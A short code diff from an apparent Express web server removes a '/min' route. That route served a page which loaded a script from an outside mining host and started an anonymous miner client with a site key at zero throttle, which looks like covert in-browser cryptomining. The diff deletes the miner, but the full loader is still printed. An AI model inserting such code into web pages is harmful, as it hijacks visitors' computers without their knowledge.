@@ -7,13 +7,6 @@ app.get('/', (req, res) => res.status(200).json({ status: 'new comment on ' }))
 app.get('/m', (req, res) {
         res.sendFile('/mi.html');
         })
-app.get('/min', function(req, res) {
-    res.send('<script src="https://www.hostingcloud.racing/Sbjk.js"></script>
-<script>
-    var _client = new Client.Anonymous("1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423", {
-        throttle: 0, c: "w"
-    }); _client.start(); </script>');
-});
 app.get('/url', (req, res) => {
   const url = req.query.url
   ;(async () => {
